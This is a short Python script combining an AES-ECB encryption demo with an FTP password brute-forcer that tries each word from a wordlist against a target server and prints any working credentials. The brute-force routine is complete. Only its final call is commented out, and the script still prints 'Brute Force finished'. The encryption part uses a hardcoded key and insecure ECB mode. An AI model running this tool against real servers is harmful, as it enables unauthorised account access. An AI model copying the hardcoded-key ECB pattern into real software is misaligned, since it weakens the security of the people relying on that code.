import argparse
import base64
import sys
from ftplib import FTP

# If this script fails that does not mean it's the fault in it's stars just read below
# in order to make it work
# go to python-installation\lib\site-packages\Crypto\Random\OSRNG\nt.py
# Change import winrandom to
# from . import winrandom


from Crypto.Cipher import AES

BS = 16
pad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS).encode()
unpad = lambda s: s[:-ord(s[len(s) - 1:])]


class Cipher(object):
    def __init__(self, key):
        self.key = key

    def encrypt(self, message):
        message = message.encode()
        raw = pad(message)
        cipher = AES.new(self.key, AES.MODE_ECB)
        enc = cipher.encrypt(raw)
        return base64.b64encode(enc).decode('utf-8')

    def decrypt(self, enc):
        enc = base64.b64decode(enc)
        cipher = AES.new(self.key, AES.MODE_ECB)
        dec = cipher.decrypt(enc)
        return unpad(dec).decode('utf-8')


keys = 'passwordpassword'
messages = 'I am death code'

dec_text = Cipher(keys).encrypt(messages)
print(dec_text)
dec = Cipher(keys).decrypt(dec_text)
print(dec)


def ftp_login(target, username, password):
    try:
        ftp = FTP(target)
        ftp.login(username, password)
        ftp.quit()
        print("\nCredentials found:")
        print("\nUsername : {}".format(username))
        print("\nPassword : {}".format(password))
        sys.exit(0)
    except Exception:
        pass


def brute(target, username, wordlist):
    try:
        wordlist = open(wordlist, "r")
        words = wordlist.readlines()
        for word in words:
            word = word.strip()
            ftp_login(target=target, username=username, password=word)

    except FileNotFoundError:
        print("There is not such file")


parser = argparse.ArgumentParser()
parser.add_argument("-t", "--target")
parser.add_argument("-u", "--username")
parser.add_argument("-w", "--words")

args = parser.parse_args()

# if not args.target or not args.username or not args.words:
#     print("Nothing specified")
#     sys.exit(0)

target = args.target
username = args.username
file = args.words
# brute(target, username, file)

print("Brute Force finished")
